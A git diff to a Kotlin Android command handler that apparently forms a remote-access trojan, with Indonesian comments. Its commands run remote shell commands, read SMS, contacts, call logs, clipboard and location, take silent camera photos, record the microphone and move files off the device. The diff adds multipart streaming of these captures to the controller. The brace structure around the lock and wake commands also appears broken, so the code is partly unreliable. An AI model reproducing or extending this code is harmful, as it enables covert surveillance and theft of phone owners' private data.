@@ -23,6 +23,7 @@ import android.content.ClipData
 import java.util.Locale
 import android.location.LocationManager
 import android.net.Uri
+import java.io.File
 import java.net.Inet4Address
 import java.net.Inet6Address
 import java.net.NetworkInterface
@@ -74,7 +75,7 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
         return ContextCompat.checkSelfPermission(context, perm) == PackageManager.PERMISSION_GRANTED
     }
 
-    fun handle(jsonStr: String, sendResponse: (String) -> Unit): String? {
+    fun handle(jsonStr: String, onResponse: (String) -> Unit, onMultipart: ((String, File, String) -> Unit)? = null): String? {
         var cmdId = ""
         try {
             val json = JSONObject(jsonStr)
@@ -91,7 +92,7 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
             when (command) {
                 "ping" -> {
                     val resp = createResponse(cmdId, "pong", "Alive")
-                    sendResponse(resp)
+                    onResponse(resp)
                     return resp
                 }
                 "get_device_info" -> {
@@ -106,14 +107,14 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
                         put("ipv6", ips.second)
                     }
                     val resp = createResponse(cmdId, "device_info", info)
-                    sendResponse(resp)
+                    onResponse(resp)
                     return resp
                 }
                 "get_battery" -> {
                     val bm = context.getSystemService(Context.BATTERY_SERVICE) as BatteryManager
                     val level = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
                     val resp = createResponse(cmdId, "battery_level", level)
-                    sendResponse(resp)
+                    onResponse(resp)
                     return resp
                 }
                 "show_toast" -> {
@@ -121,7 +122,7 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
                         Toast.makeText(context, textArg.ifEmpty { "Remote Command" }, Toast.LENGTH_SHORT).show()
                     }
                     val resp = createResponse(cmdId, "toast", "Displayed: $textArg")
-                    sendResponse(resp)
+                    onResponse(resp)
                     return resp
                 }
                 "device_lock", "lock_screen" -> {
@@ -131,7 +132,7 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
                         if (dpm.isAdminActive(compName)) {
                             dpm.lockNow()
                             val resp = createResponse(cmdId, "success", "Screen locked")
-                            sendResponse(resp); return resp
+                            onResponse(resp); return resp
                         } else {
                             val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                                 putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, compName)
@@ -140,31 +141,39 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
                             }
                             context.startActivity(intent)
                             val resp = createResponse(cmdId, "info", "Aktivasi Device Admin diperlukan di perangkat.")
-                            sendResponse(resp); return resp
-                        }
-                    } catch (e: Exception) {
-                        val resp = createResponse(cmdId, "error", "Lock failed: ${e.message}")
-                        sendResponse(resp); return resp
-                    }
+                            onResponse(resp); return resp
                 }
-                "device_wake", "screen_on" -> {
-                    try {
-                        val pm = context.getSystemService(Context.POWER_SERVICE) as PowerManager
-                        @Suppress("DEPRECATION")
-                        val wl = pm.newWakeLock(
-                            PowerManager.SCREEN_BRIGHT_WAKE_LOCK or
-                            PowerManager.ACQUIRE_CAUSES_WAKEUP or
-                            PowerManager.ON_AFTER_RELEASE,
-                            "rac-js:wakeup"
-                        )
-                        wl.acquire(5000L) // Hidupkan selama 5 detik
-                        val resp = createResponse(cmdId, "success", "Screen woken up")
-                        sendResponse(resp); return resp
-                    } catch (e: Exception) {
-                        val resp = createResponse(cmdId, "error", "Wake failed: ${e.message}")
-                        sendResponse(resp); return resp
-                    }
+            } catch (e: Exception) {
+                val resp = createResponse(cmdId, "error", "Lock failed: ${e.message}")
+                onResponse(resp); return resp
+            }
+        }
+        "device_wake", "screen_on" -> {
+            try {
+                val pm = context.getSystemService(Context.POWER_SERVICE) as PowerManager
+                @Suppress("DEPRECATION")
+                val wl = pm.newWakeLock(
+                    PowerManager.SCREEN_BRIGHT_WAKE_LOCK or
+                    PowerManager.ACQUIRE_CAUSES_WAKEUP or
+                    PowerManager.ON_AFTER_RELEASE,
+                    "rac-js:wakeup"
+                )
+                wl.acquire(10000L) // Hidupkan selama 10 detik (lebih lama)
+                
+                // Jika Device Admin aktif, coba cara tambahan
+                val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
+                val compName = android.content.ComponentName(context, DeviceAdminReceiver::class.java)
+                if (dpm.isAdminActive(compName)) {
+                    // Sayangnya dpm tidak punya "wakeNow", tapi acqureCausesWakeup + user activity sudah cukup kuat
                 }
+
+                val resp = createResponse(cmdId, "success", "Screen woken up (Aggressive)")
+                onResponse(resp); return resp
+            } catch (e: Exception) {
+                val resp = createResponse(cmdId, "error", "Wake failed: ${e.message}")
+                onResponse(resp); return resp
+            }
+        }
                 "vibrate" -> {
                     try {
                         val durationMs = (textArg.toFloatOrNull() ?: 1f) * 1000L
@@ -178,11 +187,11 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
                             vib.vibrate(effect)
                         }
                         val resp = createResponse(cmdId, "success", "Vibrating ${durationMs.toLong()}ms")
-                        sendResponse(resp)
+                        onResponse(resp)
                         return resp
                     } catch (e: Exception) {
                         val resp = createResponse(cmdId, "error", "Vibrate failed: ${e.message}")
-                        sendResponse(resp)
+                        onResponse(resp)
                         return resp
                     }
                 }
@@ -198,11 +207,11 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
                         while (errorReader.readLine().also { line = it } != null) output.append(line).append("\n")
                         process.waitFor()
                         val resp = createResponse(cmdId, "shell_output", output.toString())
-                        sendResponse(resp)
+                        onResponse(resp)
                         return resp
                     } catch (e: Exception) {
                         val resp = createResponse(cmdId, "error", "Shell failed: ${e.message}")
-                        sendResponse(resp)
+                        onResponse(resp)
                         return resp
                     }
                 }
@@ -221,7 +230,7 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
                         put("notification_max", am.getStreamMaxVolume(AudioManager.STREAM_NOTIFICATION))
                     }
                     val resp = createResponse(cmdId, "volume_info", volInfo)
-                    sendResponse(resp)
+                    onResponse(resp)
                     return resp
                 }
                 "set_volume" -> {
@@ -235,7 +244,7 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
                             put("notification", am.getStreamVolume(AudioManager.STREAM_NOTIFICATION))
                         }
                         val resp = createResponse(cmdId, "volume_info", volInfo)
-                        sendResponse(resp)
+                        onResponse(resp)
                         return resp
                     } else {
                         val parts = textArg.trim().split(Regex("\\s+"))
@@ -297,11 +306,11 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
                                 }
 
                                 val resp = createResponse(cmdId, "success", "$statusMsg (Range: $min-$max)")
-                                sendResponse(resp)
+                                onResponse(resp)
                                 return resp
                             } catch (e: Exception) {
                                 val resp = createResponse(cmdId, "error", "Gagal: ${e.message}")
-                                sendResponse(resp)
+                                onResponse(resp)
                                 return resp
                             }
                         }
@@ -315,18 +324,18 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
                         camManager.setTorchMode(cameraId, state)
                         isTorchOn = state
                         val resp = createResponse(cmdId, "success", "Torch $state")
-                        sendResponse(resp)
+                        onResponse(resp)
                         return resp
                     } catch (e: Exception) {
                         val resp = createResponse(cmdId, "error", "Torch err: ${e.message}")
-                        sendResponse(resp)
+                        onResponse(resp)
                         return resp
                     }
                 }
                 "tts" -> {
                     tts?.speak(textArg, TextToSpeech.QUEUE_ADD, null, null)
                     val resp = createResponse(cmdId, "success", "Speaking...")
-                    sendResponse(resp)
+                    onResponse(resp)
                     return resp
                 }
                 "notify" -> {
@@ -345,7 +354,7 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
                         .build()
                     notificationManager.notify((System.currentTimeMillis() % 10000).toInt(), notification)
                     val resp = createResponse(cmdId, "success", "Pushed")
-                    sendResponse(resp)
+                    onResponse(resp)
                     return resp
                 }
                 "sensors" -> {
@@ -354,14 +363,14 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
                     val result = JSONArray()
                     for (s in list) { result.put(JSONObject().apply { put("name", s.name); put("type", s.type) }) }
                     val resp = createResponse(cmdId, "sensor_list", result)
-                    sendResponse(resp)
+                    onResponse(resp)
                     return resp
                 }
                 "clipboard" -> {
                     val cm = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
                     val txt = if (cm.hasPrimaryClip()) cm.primaryClip?.getItemAt(0)?.text?.toString() ?: "" else ""
                     val resp = createResponse(cmdId, "clipboard", txt)
-                    sendResponse(resp)
+                    onResponse(resp)
                     return resp
                 }
                 "upload" -> {
@@ -372,16 +381,16 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
                             val data = android.util.Base64.decode(parts[1], android.util.Base64.DEFAULT)
                             java.io.File(path).writeBytes(data)
                             val resp = createResponse(cmdId, "success", "Berhasil diunggah: ${java.io.File(path).name}")
-                            sendResponse(resp)
+                            onResponse(resp)
                             return resp
                         } else {
                             val resp = createResponse(cmdId, "error", "Payload upload tidak valid")
-                            sendResponse(resp)
+                            onResponse(resp)
                             return resp
                         }
                     } catch (e: Exception) {
                         val resp = createResponse(cmdId, "error", "Gagal upload: ${e.message}")
-                        sendResponse(resp)
+                        onResponse(resp)
                         return resp
                     }
                 }
@@ -400,7 +409,7 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
                                 })
                             }
                             val resp = createResponse(cmdId, "ls_result", arr)
-                            sendResponse(resp)
+                            onResponse(resp)
                             return resp
                         }
                     } catch (e: Exception) {}
@@ -410,14 +419,24 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
                         val facing = textArg.lowercase()
                         val useFront = facing == "front"
                         val bytes = capturePhotoBytes(useFront)
-                        val b64 = android.util.Base64.encodeToString(bytes, android.util.Base64.NO_WRAP)
-                        // Kirim sebagai photo_base64 (string langsung) agar server bisa simpan ke file
-                        val resp = createResponse(cmdId, "photo_base64", b64)
-                        sendResponse(resp)
-                        return resp
+                        
+                        // Coba kirim via multipart jika didukung (efisien RAM/Traffic)
+                        if (onMultipart != null) {
+                            val tempFile = File(context.cacheDir, "snap_${System.currentTimeMillis()}.jpg")
+                            tempFile.writeBytes(bytes)
+                            val jsonResp = createResponse(cmdId, "photo_multipart", "Streaming via multipart")
+                            onMultipart(jsonResp, tempFile, "media_file")
+                            return jsonResp
+                        } else {
+                            // Fallback ke base64 (untuk Local Web Server)
+                            val b64 = android.util.Base64.encodeToString(bytes, android.util.Base64.NO_WRAP)
+                            val resp = createResponse(cmdId, "photo_base64", b64)
+                            onResponse(resp)
+                            return resp
+                        }
                     } catch (e: Exception) {
                         val resp = createResponse(cmdId, "error", "Photo failed: ${e.message}")
-                        sendResponse(resp)
+                        onResponse(resp)
                         return resp
                     }
                 }
@@ -450,10 +469,10 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
                             }
                         }
                         val resp = createResponse(cmdId, "call_logs", res)
-                        sendResponse(resp); return resp
+                        onResponse(resp); return resp
                     } else {
                         val resp = createResponse(cmdId, "error", "Izin READ_CALL_LOG tidak diberikan")
-                        sendResponse(resp); return resp
+                        onResponse(resp); return resp
                     }
                 }
                 "app_list" -> {
@@ -470,7 +489,7 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
                             })
                         }
                     val resp = createResponse(cmdId, "app_list", res)
-                    sendResponse(resp); return resp
+                    onResponse(resp); return resp
                 }
                 "launch_app" -> {
                     try {
@@ -479,14 +498,14 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
                             intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                             context.startActivity(intent)
                             val resp = createResponse(cmdId, "success", "Membuka $textArg")
-                            sendResponse(resp); return resp
+                            onResponse(resp); return resp
                         } else {
                             val resp = createResponse(cmdId, "error", "App tidak ditemukan: $textArg")
-                            sendResponse(resp); return resp
+                            onResponse(resp); return resp
                         }
                     } catch (e: Exception) {
                         val resp = createResponse(cmdId, "error", "Launch failed: ${e.message}")
-                        sendResponse(resp); return resp
+                        onResponse(resp); return resp
                     }
                 }
                 "uninstall_app" -> {
@@ -497,10 +516,10 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
                         }
                         context.startActivity(intent)
                         val resp = createResponse(cmdId, "success", "Dialog uninstall dibuka untuk $textArg")
-                        sendResponse(resp); return resp
+                        onResponse(resp); return resp
                     } catch (e: Exception) {
                         val resp = createResponse(cmdId, "error", "Uninstall failed: ${e.message}")
-                        sendResponse(resp); return resp
+                        onResponse(resp); return resp
                     }
                 }
                 "play_sound" -> {
@@ -511,10 +530,10 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
                         mp.start()
                         mp.setOnCompletionListener { it.release() }
                         val resp = createResponse(cmdId, "success", "Memutar: $textArg")
-                        sendResponse(resp); return resp
+                        onResponse(resp); return resp
                     } catch (e: Exception) {
                         val resp = createResponse(cmdId, "error", "Putar gagal: ${e.message}")
-                        sendResponse(resp); return resp
+                        onResponse(resp); return resp
                     }
                 }
                 "contacts" -> {
@@ -530,7 +549,7 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
                             }
                         }
                         val resp = createResponse(cmdId, "contacts_list", res)
-                        sendResponse(resp); return resp
+                        onResponse(resp); return resp
                     }
                 }
                 "sms_list" -> {
@@ -546,7 +565,7 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
                             }
                         }
                         val resp = createResponse(cmdId, "sms_inbox", res)
-                        sendResponse(resp); return resp
+                        onResponse(resp); return resp
                     }
                 }
                 "wifi_scan" -> {
@@ -560,7 +579,7 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
                         })
                     }
                     val resp = createResponse(cmdId, "wifi_networks", res)
-                    sendResponse(resp); return resp
+                    onResponse(resp); return resp
                 }
                 "location" -> {
                     if (checkPerm(Manifest.permission.ACCESS_FINE_LOCATION)) {
@@ -574,10 +593,10 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
                                 put("google_maps", "https://maps.google.com/?q=${loc.latitude},${loc.longitude}")
                             }
                             val resp = createResponse(cmdId, "location_data", obj)
-                            sendResponse(resp); return resp
+                            onResponse(resp); return resp
                         } else {
                             val resp = createResponse(cmdId, "error", "Location tidak tersedia")
-                            sendResponse(resp); return resp
+                            onResponse(resp); return resp
                         }
                     }
                 }
@@ -601,12 +620,12 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
                     }
                     if (root.exists()) walk(root, 0)
                     val resp = createResponse(cmdId, "find_result", res)
-                    sendResponse(resp); return resp
+                    onResponse(resp); return resp
                 }
                 "record_sound" -> {
                     try {
                         val duration = textArg.toLongOrNull() ?: 5L
-                        val file = java.io.File(context.cacheDir, "record.mp4")
+                        val file = File(context.cacheDir, "record_${System.currentTimeMillis()}.mp4")
                         val mr = android.media.MediaRecorder()
                         mr.setAudioSource(android.media.MediaRecorder.AudioSource.MIC)
                         mr.setOutputFormat(android.media.MediaRecorder.OutputFormat.MPEG_4)
@@ -615,12 +634,19 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
                         mr.prepare(); mr.start()
                         Thread.sleep(duration * 1000)
                         mr.stop(); mr.release()
-                        val b64 = android.util.Base64.encodeToString(file.readBytes(), android.util.Base64.DEFAULT)
-                        val resp = createResponse(cmdId, "audio_base64", b64)
-                        sendResponse(resp); return resp
+                        
+                        if (onMultipart != null) {
+                            val jsonResp = createResponse(cmdId, "audio_multipart", "Audio recorded")
+                            onMultipart(jsonResp, file, "media_file")
+                            return jsonResp
+                        } else {
+                            val b64 = android.util.Base64.encodeToString(file.readBytes(), android.util.Base64.DEFAULT)
+                            val resp = createResponse(cmdId, "audio_base64", b64)
+                            onResponse(resp); return resp
+                        }
                     } catch (e: Exception) {
                         val resp = createResponse(cmdId, "error", e.message ?: "Record failed")
-                        sendResponse(resp); return resp
+                        onResponse(resp); return resp
                     }
                 }
                 "set_web_server" -> {
@@ -632,10 +658,10 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
                         }
                         context.startService(intent)
                         val resp = createResponse(cmdId, "success", "Local Web Server set to " + if (enabled) "ON" else "OFF")
-                        sendResponse(resp); return resp
+                        onResponse(resp); return resp
                     } catch (e: Exception) {
                         val resp = createResponse(cmdId, "error", "Failed to toggle web server: ${e.message}")
-                        sendResponse(resp); return resp
+                        onResponse(resp); return resp
                     }
                 }
             }
@@ -646,27 +672,32 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
                     val f = java.io.File(textArg)
                     if (f.exists()) {
                         val del = if (f.isDirectory) f.deleteRecursively() else f.delete()
-                        sendResponse(createResponse(cmdId, if (del) "success" else "error", "RM: $textArg"))
+                        onResponse(createResponse(cmdId, if (del) "success" else "error", "RM: $textArg"))
                     }
                 }
                 "mv" -> {
                     val p = textArg.split("|")
                     if (p.size == 2 && java.io.File(p[0]).renameTo(java.io.File(p[1])))
-                        sendResponse(createResponse(cmdId, "success", "Moved"))
+                        onResponse(createResponse(cmdId, "success", "Moved"))
                 }
                 "download" -> {
                     Thread {
-                        val f = java.io.File(textArg)
+                        val f = File(textArg)
                         if (f.exists()) {
-                            val b64 = android.util.Base64.encodeToString(f.readBytes(), android.util.Base64.DEFAULT)
-                            sendResponse(createResponse(cmdId, "file_download", JSONObject().apply { put("name", f.name); put("data", b64) }))
+                            if (onMultipart != null) {
+                                val jsonResp = createResponse(cmdId, "file_multipart", "File download")
+                                onMultipart(jsonResp, f, "media_file")
+                            } else {
+                                val b64 = android.util.Base64.encodeToString(f.readBytes(), android.util.Base64.DEFAULT)
+                                onResponse(createResponse(cmdId, "file_download", JSONObject().apply { put("name", f.name); put("data", b64) }))
+                            }
                         }
                     }.start()
                 }
             }
         } catch (e: Exception) {
             val resp = createResponse(cmdId, "error", e.message ?: "Err")
-            sendResponse(resp); return resp
+            onResponse(resp); return resp
         }
         return null
     }
